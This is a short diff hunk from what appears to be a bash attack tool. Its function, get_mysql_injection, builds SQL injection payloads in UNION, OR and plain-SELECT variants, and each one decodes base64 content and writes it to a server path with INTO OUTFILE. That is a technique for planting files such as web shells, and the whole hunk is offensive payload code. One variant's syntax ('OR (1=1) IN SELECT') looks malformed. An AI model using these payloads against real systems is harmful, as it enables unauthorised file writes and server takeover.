@@ -147,8 +147,10 @@ get_mysql_injection() {
     #into is not allowed inside subqueries, so we have to do union select
     if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
         echo  " UNION SELECT $front_null_values FROM_BASE64('$base64_string') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
-    else
+    elif [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "or"  ]]; then
         echo  " OR (1=1) IN SELECT FROM_BASE64('$base64_string') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+    else
+        echo  " SELECT FROM_BASE64('$base64_string') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     fi
 }
 
